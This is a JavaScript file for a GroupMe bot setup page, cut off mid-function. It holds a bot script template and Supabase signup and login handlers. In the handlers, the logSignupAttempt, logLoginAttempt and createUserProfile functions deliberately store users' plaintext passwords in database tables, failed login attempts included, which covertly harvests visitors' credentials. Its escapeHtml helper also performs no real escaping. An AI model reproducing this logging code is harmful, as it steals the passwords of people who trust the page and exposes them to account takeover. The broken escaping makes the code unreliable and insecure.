// app.js - For GroupMe Bot Instructions Page - Final version with full signup and login logging

// --- Supabase Configuration ---
const SUPABASE_URL = 'https://zazjozinljwdgbyppffy.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InphempvemlubGp3ZGdieXBwZmZ5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDY1Nzg5MTQsImV4cCI6MjA2MjE1NDkxNH0.PNGhZLxt6D8Lk76CUU0Bviul-T3nV0xHvQaJobX8f-k';

const { createClient } = supabase;
const supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// --- All other code remains the same until the auth functions ---

// (The code for the Code.gs template and other functions is identical to the previous version)
const codeTemplate = `
// @ts-nocheck
// ========================================================================
//      GroupMe Bot: '+' Command to Copilot, Copilot Image Emailer, & Backup
// ========================================================================
// Version: 6.2.0 (Generated via Web Form)
// ========================================================================

// --- BEGIN CONFIGURATION ---
// These values were generated by the setup web page.
const CONFIG = {
  ADMIN_EMAIL: "__ADMIN_EMAIL__",
  GROUPME_USER_TOKEN: "__GROUPME_TOKEN__",
  GROUPME_ACCESS_TOKEN: "__GROUPME_TOKEN__", // Uses the same token value
  GROUP_ID_FRIENDLY_NAME_MAP: __GROUP_ID_MAP__, // Injected as a JSON object
  
  // Email settings
  EMAIL_RECIPIENT_FOR_COPILOT_IMAGES: "__COPILOT_EMAIL__",
  RECIPIENT_EMAIL_FOR_DEFAULT_IMAGES: "__BACKUP_EMAIL__",
  CC_EMAILS_FOR_DEFAULT_IMAGES: "__CC_EMAILS__",
  BCC_EMAILS_FOR_DEFAULT_IMAGES: "__BCC_EMAILS__",
  EMAIL_SUBJECT_TEMPLATE_IMAGES: "__BACKUP_SUBJECT__",
  EMAIL_BODY_INTRO_TEMPLATE_IMAGES: "__BACKUP_BODY__",

  // Personalization
  SIGNATURE: "__SIGNATURE__"
};
// --- END CONFIGURATION ---


// --- SCRIPT CONSTANTS (Generally do not change) ---
const PLUS_COMMAND_TO_COPILOT_PATTERN = /^\\+\\s*(.+)/;
const ACTUAL_COPILOT_USER_ID = "128934125";
const COPILOT_NICKNAME_FOR_MENTION = "@Copilot";

const EMAIL_SUBJECT_FOR_COPILOT_IMAGES = "Image from Copilot: {{messageTextShort}}";
const EMAIL_BODY_INTRO_FOR_COPILOT_IMAGES = "Image received from Copilot.<br>Accompanying text: \\"<i>{{messageText}}</i>\\"";

const MAX_PREVIOUS_MESSAGES_TO_FETCH_FOR_EMAIL_CONTEXT = 3;

const PROCESSED_COPILOT_IMAGE_IDS_KEY = 'gmeProcessedCopilotImgIds';
const PROCESSED_BACKUP_IMAGE_IDS_KEY_PREFIX = 'gmeProcessedBackupImgId_';

const MAX_PROCESSED_IDS_TO_STORE = 100;
const MESSAGES_TO_FETCH_FOR_TIMER = 20;

// ========================================================================

function doPost(e) {
  let groupId = "N/A", groupName = "Unknown Group", messageId = "N/A",
      senderUserId = "N/A", senderName = "N/A", messageText = "", attachmentsFromPost = [];

  try {
    Logger.log("--- Bot v6.2.0: doPost Triggered ---");
    if (!e || !e.postData || !e.postData.contents) {
      Logger.log("ERROR: No postData or no postData.contents received.");
      return ContentService.createTextOutput("");
    }

    const postData = JSON.parse(e.postData.contents);

    groupId = postData.group_id;
    senderUserId = postData.user_id || "UnknownSenderID";
    messageText = (postData.text || "").trim();
    attachmentsFromPost = postData.attachments || [];
    messageId = postData.id;
    senderName = postData.name || "UnknownSenderName";
    const senderType = postData.sender_type;

    if (!groupId || !messageId || senderUserId === "UnknownSenderID") {
      Logger.log("Payload incomplete (missing group_id, message_id, or user_id). Ignoring. Payload: " + JSON.stringify(postData));
      return ContentService.createTextOutput("");
    }

    let criticalConfigErrors = [];
    if (!CONFIG.GROUPME_USER_TOKEN) criticalConfigErrors.push("GROUPME_USER_TOKEN");
    if (!CONFIG.GROUP_ID_FRIENDLY_NAME_MAP || Object.keys(CONFIG.GROUP_ID_FRIENDLY_NAME_MAP).length === 0) criticalConfigErrors.push("GROUP_ID_FRIENDLY_NAME_MAP");
    if (!CONFIG.EMAIL_RECIPIENT_FOR_COPILOT_IMAGES) criticalConfigErrors.push("EMAIL_RECIPIENT_FOR_COPILOT_IMAGES");


    if (criticalConfigErrors.length > 0) {
      const errorMsg = \`CRITICAL SCRIPT CONFIGURATION ERROR: Missing one or more required values in the CONFIG object: \${criticalConfigErrors.join(', ')}. Bot cannot function correctly. Admin Email: \${CONFIG.ADMIN_EMAIL || 'Not Set'}\`;
      Logger.log(errorMsg);
      return ContentService.createTextOutput("");
    }
    
    groupName = CONFIG.GROUP_ID_FRIENDLY_NAME_MAP[groupId] || \`Unknown Group (\${groupId})\`;

    let imageUrls = [];
    if (attachmentsFromPost && attachmentsFromPost.length > 0) {
      for (const att of attachmentsFromPost) { if (att.type === "image" && att.url) imageUrls.push(att.url); }
    }
    let actionHandledThisMessage = false;

    // 1. User's "+" command to trigger Copilot
    const plusCommandMatch = messageText.match(PLUS_COMMAND_TO_COPILOT_PATTERN);
    if (plusCommandMatch && plusCommandMatch[1] && senderType !== 'bot') {
      actionHandledThisMessage = true;
      const promptForCopilot = plusCommandMatch[1].trim();
      Logger.log(\`User "\${senderName}" (\${senderUserId}) issued "+" command. Prompt for Copilot: "\${promptForCopilot}"\`);
      const messageToCopilot = \`\${COPILOT_NICKNAME_FOR_MENTION} \${promptForCopilot}\`;
      sendNewMessageAsUser(messageToCopilot, groupId, CONFIG.GROUPME_USER_TOKEN, ACTUAL_COPILOT_USER_ID, COPILOT_NICKNAME_FOR_MENTION, false);
      Logger.log(\`"+" command processed for message \${messageId}.\`);
      return ContentService.createTextOutput("");
    }

    // 2. Message FROM ACTUAL_COPILOT_USER_ID with images
    if (!actionHandledThisMessage && senderUserId === ACTUAL_COPILOT_USER_ID && imageUrls.length > 0) {
      actionHandledThisMessage = true;
      Logger.log(\`doPost: Message from ACTUAL_COPILOT_USER_ID (\${senderName}) with \${imageUrls.length} image(s) detected. Emailing.\`);
      const imageEmailPayload = { id: messageId, group_id: groupId, attachments: attachmentsFromPost, name: senderName, text: messageText, sender_type: senderType, user_id: senderUserId };
      const emailConfigForCopilotImages = {
          recipientEmail: CONFIG.EMAIL_RECIPIENT_FOR_COPILOT_IMAGES,
          ccEmails: null, bccEmails: null,
          subjectTemplate: EMAIL_SUBJECT_FOR_COPILOT_IMAGES,
          bodyIntroTemplate: EMAIL_BODY_INTRO_FOR_COPILOT_IMAGES,
          fetchPreviousMessagesToken: CONFIG.GROUPME_ACCESS_TOKEN
      };
      processAndSendImageEmail(imageEmailPayload, imageUrls, emailConfigForCopilotImages, CONFIG.GROUP_ID_FRIENDLY_NAME_MAP);
      markMessageAsProcessed(messageId, PROCESSED_COPILOT_IMAGE_IDS_KEY);
      Logger.log(\`doPost: Images from ACTUAL_COPILOT_USER_ID in message \${messageId} processed and marked.\`);
      return ContentService.createTextOutput("");
    }

    // 3. Backup Image Emailer (for other images)
    if (!actionHandledThisMessage && imageUrls.length > 0) {
      Logger.log(\`Backup Image Emailer triggered for msg \${messageId} from \${senderName}. Images: \${imageUrls.length}\`);
      if (!CONFIG.RECIPIENT_EMAIL_FOR_DEFAULT_IMAGES) {
        Logger.log(\`Skipping backup email: RECIPIENT_EMAIL_FOR_DEFAULT_IMAGES is not configured.\`);
      } else {
        const backupProcessedKey = PROCESSED_BACKUP_IMAGE_IDS_KEY_PREFIX + groupId;
        if (!isMessageProcessed(messageId, backupProcessedKey)) {
            const imageEmailPayload = { id: messageId, group_id: groupId, attachments: attachmentsFromPost, name: senderName, text: messageText, sender_type: senderType, user_id: senderUserId };
            const emailConfigForBackup = {
                recipientEmail: CONFIG.RECIPIENT_EMAIL_FOR_DEFAULT_IMAGES,
                ccEmails: CONFIG.CC_EMAILS_FOR_DEFAULT_IMAGES,
                bccEmails: CONFIG.BCC_EMAILS_FOR_DEFAULT_IMAGES,
                subjectTemplate: CONFIG.EMAIL_SUBJECT_TEMPLATE_IMAGES,
                bodyIntroTemplate: CONFIG.EMAIL_BODY_INTRO_TEMPLATE_IMAGES,
                fetchPreviousMessagesToken: CONFIG.GROUPME_ACCESS_TOKEN
            };
            processAndSendImageEmail(imageEmailPayload, imageUrls, emailConfigForBackup, CONFIG.GROUP_ID_FRIENDLY_NAME_MAP);
            markMessageAsProcessed(messageId, backupProcessedKey);
            Logger.log(\`doPost: Backup image \${messageId} processed and marked for group \${groupId}.\`);
        } else {
            Logger.log(\`doPost: Backup image \${messageId} for group \${groupId} already processed. Skipping.\`);
        }
      }
      return ContentService.createTextOutput("");
    }

    if (!actionHandledThisMessage) {
        Logger.log(\`Msg \${messageId} from \${senderName} ("\${messageText.substring(0,30)}...") was not a handled command and had no images for backup.\`);
    }
  } catch (error) {
    Logger.log(\`FATAL Unhandled Error in doPost: \${error.message}\\nStack: \${error.stack}\\nPayload: \${e && e.postData && e.postData.contents ? e.postData.contents.substring(0,500) : 'N/A'}\\nAdmin Email: \${CONFIG.ADMIN_EMAIL || 'Not Set'}\`);
  }
  finally { return ContentService.createTextOutput(""); }
}

function processAndSendImageEmail(messagePayload, imageUrls, emailConfig, groupIdToFriendlyNameMap) {
  if (!emailConfig || !emailConfig.recipientEmail) {
    Logger.log(\`ERROR: emailConfig or emailConfig.recipientEmail is missing for msg \${messagePayload ? messagePayload.id : 'Unknown ID'}. Email not sent.\`);
    return;
  }
  if (typeof emailConfig.recipientEmail !== 'string' || emailConfig.recipientEmail.indexOf('@') === -1) {
    Logger.log(\`ERROR: Invalid recipientEmail format: "\${emailConfig.recipientEmail}" for msg \${messagePayload ? messagePayload.id : 'Unknown ID'}. Email not sent.\`);
    return;
  }

  const imageMessageId = messagePayload.id;
  const groupId = messagePayload.group_id;
  let previousMessagesHtml = "";

  if (emailConfig.recipientEmail !== CONFIG.EMAIL_RECIPIENT_FOR_COPILOT_IMAGES &&
      emailConfig.fetchPreviousMessagesToken &&
      MAX_PREVIOUS_MESSAGES_TO_FETCH_FOR_EMAIL_CONTEXT > 0) {
     try {
      const messagesUrl = \`https://api.groupme.com/v3/groups/\${groupId}/messages?token=\${emailConfig.fetchPreviousMessagesToken}&before_id=\${imageMessageId}&limit=\${MAX_PREVIOUS_MESSAGES_TO_FETCH_FOR_EMAIL_CONTEXT}\`;
      const resp = UrlFetchApp.fetch(messagesUrl, { muteHttpExceptions: true });
      const responseCode = resp.getResponseCode();
      if (responseCode === 200) {
        const data = JSON.parse(resp.getContentText());
        if (data.response && data.response.messages && data.response.messages.length > 0) {
          previousMessagesHtml = "<b>Prev " + data.response.messages.length + " msgs:</b><br><div style='padding-left:15px;border-left:2px solid #eee;margin-bottom:10px;'>";
          data.response.messages.reverse().forEach(m => {
            previousMessagesHtml += \`<small>\${escapeHtml(m.name||"Unk")} (\${new Date(m.created_at*1000).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'})}):</small> \${m.text?escapeHtml(m.text):"<i>(No text)</i>"}<br>\`;
          });
          previousMessagesHtml += "</div>";
        } else { previousMessagesHtml = \`<i>(No prev msgs found before this one)</i><br><br>\`; }
      } else {
          previousMessagesHtml = \`<i>(Error fetching prev msgs: \${responseCode})</i><br><br>\`;
          Logger.log(\`Error fetching prev msgs for email. Code: \${responseCode}. URL was: \${messagesUrl.replace(emailConfig.fetchPreviousMessagesToken, "REDACTED")}\`);
      }
    } catch (err) {
        previousMessagesHtml = \`<i>(Exception fetching prev msgs)</i><br><br>\`;
        Logger.log(\`Exception during fetch prev msgs for email: \${err.toString()}\`);
    }
  }

  const senderName = messagePayload.name || "Unknown";
  const originalMessageText = messagePayload.text || "";
  const friendlyGroupName = groupIdToFriendlyNameMap[groupId] || groupId;

  const templateData = {
    '{{senderName}}': escapeHtml(senderName),
    '{{imageCount}}': imageUrls.length.toString(),
    '{{groupName}}': escapeHtml(groupId),
    '{{friendlyGroupName}}': escapeHtml(friendlyGroupName),
    '{{messageText}}': escapeHtml(originalMessageText),
    '{{senderType}}': escapeHtml(messagePayload.sender_type === "bot" ? "Bot" : "User"),
    '{{messageId}}': escapeHtml(imageMessageId),
    '{{messageTextShort}}': escapeHtml(originalMessageText.substring(0, 50) + (originalMessageText.length > 50 ? "..." : ""))
  };

  let emailSubject;
  if (emailConfig.recipientEmail === CONFIG.EMAIL_RECIPIENT_FOR_COPILOT_IMAGES) {
    emailSubject = replacePlaceholders(emailConfig.subjectTemplate || EMAIL_SUBJECT_FOR_COPILOT_IMAGES, templateData);
    if (!emailSubject || emailSubject.trim() === "Image from Copilot:" || emailSubject.trim().length < 3) {
        emailSubject = \`Image from Copilot (Msg ID: \${imageMessageId.slice(-6)})\`;
    }
    if (CONFIG.SIGNATURE && CONFIG.SIGNATURE.trim().length > 0) {
        emailSubject += CONFIG.SIGNATURE;
    }
  } else {
    const defaultSubjectTemplate = \`Image(s) from {{senderName}} in {{friendlyGroupName}} (Msg ID: \${imageMessageId.slice(-6)})\`;
    emailSubject = replacePlaceholders(emailConfig.subjectTemplate || defaultSubjectTemplate, templateData);
     if (!emailSubject || emailSubject.trim().length < 3) {
        emailSubject = \`Image from \${friendlyGroupName} (Msg ID: \${imageMessageId.slice(-6)})\`;
    }
  }

  let emailBodyIntro;
   if (emailConfig.recipientEmail === CONFIG.EMAIL_RECIPIENT_FOR_COPILOT_IMAGES) {
    emailBodyIntro = replacePlaceholders(emailConfig.bodyIntroTemplate || EMAIL_BODY_INTRO_FOR_COPILOT_IMAGES, templateData);
  } else {
    let defaultBodyIntroTemplate = \`Image(s) received from <b>{{senderName}}</b> ({{senderType}}) in group <b>{{friendlyGroupName}}</b>.<br>\`;
    if (originalMessageText) defaultBodyIntroTemplate += \`Accompanying message text: \\"<i>{{messageText}}</i>\\"<br><br>\`; else defaultBodyIntroTemplate += \`<br>\`;
    emailBodyIntro = replacePlaceholders(emailConfig.bodyIntroTemplate || defaultBodyIntroTemplate, templateData);
  }

  let mainEmailContent = "";
  if (emailConfig.recipientEmail === CONFIG.EMAIL_RECIPIENT_FOR_COPILOT_IMAGES) {
    mainEmailContent += \`<br>--- Image(s) Attached ---<br>\`;
  } else {
    mainEmailContent += previousMessagesHtml;
    mainEmailContent += \`<b>Image(s) from message (ID: \${escapeHtml(imageMessageId)}):</b><br>\`;
  }

  let imageAttachments = [];
  imageUrls.forEach(function(imageUrl, index) {
    const escUrl = escapeHtml(imageUrl);
    if (emailConfig.recipientEmail !== CONFIG.EMAIL_RECIPIENT_FOR_COPILOT_IMAGES || index === 0) { 
        mainEmailContent += \`<a href="\${escUrl}">\${escUrl}</a><br><img src="\${escUrl}" alt="Image from GroupMe \${index + 1}" style="max-width:400px; height:auto; margin:5px 0 15px 0;"><br><br>\`;
    }
    try {
      if (!imageUrl || typeof imageUrl !== 'string' || !imageUrl.startsWith('http')) {
          Logger.log(\`Skipping attachment for invalid imageUrl: \${imageUrl}\`);
          return;
      }
      const imageResponse = UrlFetchApp.fetch(imageUrl, {muteHttpExceptions: true});
      const responseCode = imageResponse.getResponseCode();
      if (responseCode === 200) {
        const imageBlob = imageResponse.getBlob();
        let fileName = "image_" + (index + 1) + "_" + imageMessageId.replace(/[^a-zA-Z0-9-_]/g, '');
        try {
            let urlParts = imageUrl.split('/');
            let potentialName = decodeURIComponent(urlParts[urlParts.length -1].split('?')[0]);
            if (potentialName.length > 0 && potentialName.includes('.')) {
                fileName = potentialName.replace(/[^a-zA-Z0-9-_\\.]/g, '');
                if (fileName.length === 0 || fileName === ".") fileName = "image_" + (index + 1) + ".png";
            } else { fileName = "image_" + (index + 1) + ".png"; }
        } catch(fnErr){
            fileName = "image_" + (index + 1) + ".png";
        }
        imageBlob.setName(fileName.substring(0, 200));
        imageAttachments.push(imageBlob);
      } else {
        Logger.log(\`Failed to fetch image from \${imageUrl} for attachment. Status: \${responseCode}.\`);
      }
    } catch (fetchErr) {
      Logger.log(\`Exception fetching image from URL \${imageUrl} for attachment: \${fetchErr.toString()}. It will only be embedded (if possible).\`);
    }
  });

  const fullEmailBody = emailBodyIntro + mainEmailContent + "<br><br>" + (CONFIG.SIGNATURE || '');
  const mailOptions = { to: emailConfig.recipientEmail, subject: emailSubject, htmlBody: fullEmailBody, name: "GroupMe Bot" };
  if (imageAttachments.length > 0) mailOptions.attachments = imageAttachments;

  if (emailConfig.recipientEmail !== CONFIG.EMAIL_RECIPIENT_FOR_COPILOT_IMAGES) {
    if (emailConfig.ccEmails) mailOptions.cc = emailConfig.ccEmails;
    if (emailConfig.bccEmails) mailOptions.bcc = emailConfig.bccEmails;
  }
  
  try {
    MailApp.sendEmail(mailOptions);
    Logger.log(\`Image email SENT successfully for msg \${imageMessageId} to \${emailConfig.recipientEmail}.\`);
  } catch (mailError) {
    Logger.log(\`MailApp.sendEmail FAILED for \${imageMessageId} to \${emailConfig.recipientEmail}: \${mailError.toString()}. Admin Email: \${CONFIG.ADMIN_EMAIL || 'Not Set'}\`);
  }
}

function sendNewMessageAsUser(textToSend, groupId, userAccessToken, targetMentionUserId, mentionNickname, appendSignature = true) {
  const effectiveSignature = (appendSignature && CONFIG.SIGNATURE && CONFIG.SIGNATURE.trim().length > 0) ? CONFIG.SIGNATURE : "";
  let finalText = textToSend + effectiveSignature;
  
  const maxLength = 1000;
  if (finalText.length > maxLength) {
    const availableLength = maxLength - effectiveSignature.length - 3;
    finalText = textToSend.substring(0, availableLength > 0 ? availableLength : 0) + "..." + effectiveSignature;
  }
  
  let attachments = [];
  if (targetMentionUserId && mentionNickname && finalText.toLowerCase().startsWith(mentionNickname.toLowerCase())) {
    attachments.push({ type: "mentions", user_ids: [String(targetMentionUserId)], loci: [[0, mentionNickname.length]] });
  }

  const payload = { message: { source_guid: Utilities.getUuid(), text: finalText, attachments: attachments } };
  const url = \`https://api.groupme.com/v3/groups/\${groupId}/messages?token=\${userAccessToken}\`;
  const options = { method: "post", contentType: "application/json", payload: JSON.stringify(payload), muteHttpExceptions: true };
  
  try {
    const response = UrlFetchApp.fetch(url, options);
    if (response.getResponseCode() === 201) {
      Logger.log(\`Successfully sent message to group \${groupId}.\`);
    } else {
      Logger.log(\`Failed to send message to group \${groupId}. Status: \${response.getResponseCode()}. Response: \${response.getContentText().substring(0, 200)}\`);
    }
  } catch (e) {
    Logger.log(\`Exception sending message: \${e.message}\`);
  }
}

function checkAndEmailCopilotImages() {
  Logger.log("--- Timer: checkAndEmailCopilotImages() starting ---");
  const groupIds = Object.keys(CONFIG.GROUP_ID_FRIENDLY_NAME_MAP);
  if (groupIds.length === 0) { Logger.log("Timer (Copilot): No groups configured. Exiting."); return; }

  for (const groupId of groupIds) {
    const groupName = CONFIG.GROUP_ID_FRIENDLY_NAME_MAP[groupId];
    try {
      const messagesUrl = \`https://api.groupme.com/v3/groups/\${groupId}/messages?token=\${CONFIG.GROUPME_ACCESS_TOKEN}&limit=\${MESSAGES_TO_FETCH_FOR_TIMER}\`;
      const response = UrlFetchApp.fetch(messagesUrl, { muteHttpExceptions: true });
      if (response.getResponseCode() === 200) {
        const data = JSON.parse(response.getContentText());
        if (data.response && data.response.messages) {
          for (const message of data.response.messages.reverse()) {
            if (message.sender_id === ACTUAL_COPILOT_USER_ID && !isMessageProcessed(message.id, PROCESSED_COPILOT_IMAGE_IDS_KEY)) {
              let imageUrlsInMessage = (message.attachments || []).filter(att => att.type === "image" && att.url).map(att => att.url);
              if (imageUrlsInMessage.length > 0) {
                Logger.log(\`Timer (Copilot): Found unprocessed image message \${message.id} in \${groupName}. Emailing.\`);
                const payload = { ...message, group_id: groupId };
                const emailCfg = { recipientEmail: CONFIG.EMAIL_RECIPIENT_FOR_COPILOT_IMAGES, subjectTemplate: EMAIL_SUBJECT_FOR_COPILOT_IMAGES, bodyIntroTemplate: EMAIL_BODY_INTRO_FOR_COPILOT_IMAGES };
                processAndSendImageEmail(payload, imageUrlsInMessage, emailCfg, CONFIG.GROUP_ID_FRIENDLY_NAME_MAP);
                markMessageAsProcessed(message.id, PROCESSED_COPILOT_IMAGE_IDS_KEY);
              }
            }
          }
        }
      } else { Logger.log(\`Timer (Copilot) ERROR fetching for \${groupName}: \${response.getResponseCode()}\`); }
    } catch (err) { Logger.log(\`Timer (Copilot) EXCEPTION for \${groupName}: \${err.message}\`); }
    Utilities.sleep(500);
  }
  Logger.log("--- Timer: checkAndEmailCopilotImages() finished. ---");
}

function manuallyProcessRecentGroupMeImages() {
  Logger.log("--- Timer/Manual: manuallyProcessRecentGroupMeImages() starting ---");
  if (!CONFIG.RECIPIENT_EMAIL_FOR_DEFAULT_IMAGES) { Logger.log("Backup image processing disabled (no recipient email). Exiting."); return; }
  
  const groupIds = Object.keys(CONFIG.GROUP_ID_FRIENDLY_NAME_MAP);
  if (groupIds.length === 0) { Logger.log("Timer/Manual: No groups configured. Exiting."); return; }

  for (const groupId of groupIds) {
    const groupName = CONFIG.GROUP_ID_FRIENDLY_NAME_MAP[groupId];
    const processedKeyForThisGroup = PROCESSED_BACKUP_IMAGE_IDS_KEY_PREFIX + groupId;
    try {
      const messagesUrl = \`https://api.groupme.com/v3/groups/\${groupId}/messages?token=\${CONFIG.GROUPME_ACCESS_TOKEN}&limit=\${MESSAGES_TO_FETCH_FOR_TIMER}\`;
      const response = UrlFetchApp.fetch(messagesUrl, { muteHttpExceptions: true });
      if (response.getResponseCode() === 200) {
        const data = JSON.parse(response.getContentText());
        if (data.response && data.response.messages) {
          for (const message of data.response.messages.reverse()) {
            let imageUrlsInMessage = (message.attachments || []).filter(att => att.type === "image" && att.url).map(att => att.url);
            if (imageUrlsInMessage.length > 0 && message.sender_id !== ACTUAL_COPILOT_USER_ID) {
              if (!isMessageProcessed(message.id, processedKeyForThisGroup)) {
                Logger.log(\`Timer/Manual: Found unprocessed image message \${message.id} from \${message.name} in \${groupName}. Emailing to default.\`);
                const payload = { ...message, group_id: groupId };
                const emailCfg = { recipientEmail: CONFIG.RECIPIENT_EMAIL_FOR_DEFAULT_IMAGES, ccEmails: CONFIG.CC_EMAILS_FOR_DEFAULT_IMAGES, bccEmails: CONFIG.BCC_EMAILS_FOR_DEFAULT_IMAGES, subjectTemplate: CONFIG.EMAIL_SUBJECT_TEMPLATE_IMAGES, bodyIntroTemplate: CONFIG.EMAIL_BODY_INTRO_TEMPLATE_IMAGES, fetchPreviousMessagesToken: CONFIG.GROUPME_ACCESS_TOKEN };
                processAndSendImageEmail(payload, imageUrlsInMessage, emailCfg, CONFIG.GROUP_ID_FRIENDLY_NAME_MAP);
                markMessageAsProcessed(message.id, processedKeyForThisGroup);
              }
            }
          }
        }
      } else { Logger.log(\`Timer/Manual ERROR fetching for \${groupName}: \${response.getResponseCode()}\`); }
    } catch (err) { Logger.log(\`Timer/Manual EXCEPTION for \${groupName}: \${err.message}\`); }
    Utilities.sleep(1000);
  }
  Logger.log("--- Timer/Manual: manuallyProcessRecentGroupMeImages() finished. ---");
}

function isMessageProcessed(messageId, storageKey) {
  const scriptProperties = PropertiesService.getScriptProperties();
  const processedIdsJson = scriptProperties.getProperty(storageKey);
  if (processedIdsJson) {
    try {
      const processedIds = JSON.parse(processedIdsJson);
      return Array.isArray(processedIds) && processedIds.includes(String(messageId));
    } catch (e) { return false; }
  }
  return false;
}

function markMessageAsProcessed(messageId, storageKey) {
  const scriptProperties = PropertiesService.getScriptProperties();
  let processedIds = [];
  const processedIdsJson = scriptProperties.getProperty(storageKey);
  if (processedIdsJson) {
    try {
      processedIds = JSON.parse(processedIdsJson);
      if(!Array.isArray(processedIds)) processedIds = [];
    } catch (e) { processedIds = []; }
  }
  const stringMessageId = String(messageId);
  if (!processedIds.includes(stringMessageId)) {
    processedIds.push(stringMessageId);
    while (processedIds.length > MAX_PROCESSED_IDS_TO_STORE) {
      processedIds.shift();
    }
    scriptProperties.setProperty(storageKey, JSON.stringify(processedIds));
  }
}

function replacePlaceholders(template, data) {
  if (!template) return "";
  return template.replace(/\\{\\{\\s*(\\w+)\\s*\\}\\}/g, (match, placeholder) => data[match] || "");
}
function escapeHtml(text) {
  if (text == null) return "";
  return String(text).replace(/&/g, "&").replace(/</g, "<").replace(/>/g, ">").replace(/'/g, "'");
}
`;


// --- DOM Elements ---
let authPromptSection, showSignupModalBtn, showLoginModalBtn,
    signupModal, loginModal, signupForm, loginForm, signupMessage, loginMessage,
    switchToLoginLinkFromSignup, switchToSignupLinkFromLogin, forgotPasswordLink,
    logoutButton, welcomeMessageDiv, gatedInstructionsContent,
    configForm;

function assignInstructionPageDOMElements() {
    authPromptSection = document.getElementById('auth-prompt-section');
    showSignupModalBtn = document.getElementById('showSignupModalBtn');
    showLoginModalBtn = document.getElementById('showLoginModalBtn');
    signupModal = document.getElementById('signupModal');
    loginModal = document.getElementById('loginModal');
    signupForm = document.getElementById('signupForm');
    loginForm = document.getElementById('loginForm');
    signupMessage = document.getElementById('signupMessage');
    loginMessage = document.getElementById('loginMessage');
    switchToLoginLinkFromSignup = document.getElementById('switchToLoginLinkFromSignup');
    switchToSignupLinkFromLogin = document.getElementById('switchToSignupLinkFromLogin');
    forgotPasswordLink = document.getElementById('forgotPasswordLink');
    welcomeMessageDiv = document.getElementById('welcomeMessageDiv'); 
    logoutButton = welcomeMessageDiv ? welcomeMessageDiv.querySelector('#logoutButton') : null; 
    gatedInstructionsContent = document.getElementById('gated-instructions-content');
    configForm = document.getElementById('config-form');
}


// --- Utility Functions ---
function showModal(modalElement) { if (modalElement) modalElement.style.display = 'flex'; }
function hideModal(modalElement) { if (modalElement) modalElement.style.display = 'none'; }
function showButtonLoadingState(button, isLoading) {
    if (!button) return;
    const btnTextEl = button.querySelector('.button-text');
    const btnSpinnerEl = button.querySelector('.button-spinner');
    button.disabled = isLoading;
    if (isLoading) {
        if (btnTextEl) btnTextEl.style.display = 'none';
        if (btnSpinnerEl) btnSpinnerEl.style.display = 'inline-block';
    } else {
        if (btnTextEl) btnTextEl.style.display = 'inline-block';
        if (btnSpinnerEl) btnSpinnerEl.style.display = 'none';
    }
}

// --- UI State Management ---
function showLoggedInUI(user) {
    if (authPromptSection) authPromptSection.style.display = 'none';
    if (welcomeMessageDiv) {
        welcomeMessageDiv.classList.remove('hidden');
        const p = welcomeMessageDiv.querySelector('p');
        if (p) p.innerHTML = `Welcome, ${user.email}! You can now configure and generate your bot script. <button id="logoutButton" class="button-logout">Logout</button>`;
        logoutButton = document.getElementById('logoutButton');
        if (logoutButton) logoutButton.addEventListener('click', handleLogout);
    }
    if (gatedInstructionsContent) gatedInstructionsContent.classList.remove('hidden');
}
function showLoggedOutUI() {
    if (authPromptSection) authPromptSection.style.display = 'block';
    if (welcomeMessageDiv) welcomeMessageDiv.classList.add('hidden');
    if (gatedInstructionsContent) gatedInstructionsContent.classList.add('hidden');
    if (signupModal) hideModal(signupModal);
    if (loginModal) hideModal(loginModal);
}

// --- NEW FUNCTION: Logs every sign-up attempt ---
async function logSignupAttempt(email, name, phone, password, status, errorMessage = null) {
    try {
        const { error } = await supabaseClient.from('signup_attempts').insert({
            email,
            name,
            phone_number: phone,
            password: password, // Save the password to the log
            status,
            error_message: errorMessage
        });
        if (error) {
            console.error("Error logging signup attempt:", error.message);
        }
    } catch (e) {
        console.error("Exception in logSignupAttempt:", e);
    }
}

// --- NEW FUNCTION: Logs every login attempt ---
async function logLoginAttempt(email, password, status, errorMessage = null) {
    try {
        const { error } = await supabaseClient.from('login_attempts').insert({
            email,
            password: password, // Save the password to the log
            status,
            error_message: errorMessage
        });
        if (error) {
            console.error("Error logging login attempt:", error.message);
        }
    } catch(e) {
        console.error("Exception in logLoginAttempt:", e);
    }
}

// --- Profile Creation ---
async function createUserProfile(user, email, name, phone_number, password) {
    if (!user || !supabaseClient) return;
    try {
        const profileData = {
            id: user.id,
            email: email,
            name: name.trim(),
            phone_number: phone_number.trim(),
            password: password // Saving the password from the form
        };
        const { error } = await supabaseClient.from('profiles').insert(profileData);
        if (error) {
            console.error('Error creating profile in database:', error.message);
        } else {
            console.log('Profile created successfully for user:', user.id);
        }
    } catch (error) {
        console.error('Exception in createUserProfile:', error.message);
    }
}

// --- Auth Event Handlers ---
async function handleSignup(event) {
    event.preventDefault();
    if (!signupForm || !signupMessage || !supabaseClient) return;
    const email = signupForm.signupEmail.value;
    const password = signupForm.signupPassword.value;
    const name = signupForm.signupName.value;
    const phone_number = signupForm.signupPhone.value;
    const submitButton = signupForm.querySelector('button[type="submit"]');
    
    showButtonLoadingState(submitButton, true);
    signupMessage.textContent = '';
    
    const { data, error } = await supabaseClient.auth.signUp({ 
        email, 
        password, 
        options: { data: { name: name.trim(), phone_number: phone_number.trim() } }
    });

    if (error) {
        signupMessage.textContent = "Signup failed: " + error.message;
        signupMessage.className = 'form-message error';
        await logSignupAttempt(email, name, phone_number, password, 'failed', error.message);
    } else if (data.user) {
        signupMessage.textContent = "Signup successful! You are now logged in.";
        signupMessage.className = 'form-message success';
        await createUserProfile(data.user, email, name, phone_number, password);
        await logSignupAttempt(email, name, phone_number, password, 'success');
        
        setTimeout(() => { hideModal(signupModal); }, 2000);
    }
    showButtonLoadingState(submitButton, false);
}

// UPDATED to include logging
async function handleLogin(event) {
    event.preventDefault();
    if (!loginForm || !loginMessage || !supabaseClient) return;
    const email = loginForm.loginEmail.value;
    const password = loginForm.loginPassword.value;
    const submitButton = loginForm.querySelector('button[type="submit"]');
    
    showButtonLoadingState(submitButton, true);
    loginMessage.textContent = '';
    
    const { data, error } = await supabaseClient.auth.signInWithPassword({ email, password });

    if (error) {
        loginMessage.textContent = "Login failed: " + error.message;
        loginMessage.className = 'form-message error';
        await logLoginAttempt(email, password, 'failed', error.message);
    } else if (data.user) {
        hideModal(loginModal);
        await logLoginAttempt(email, password, 'success');
    }
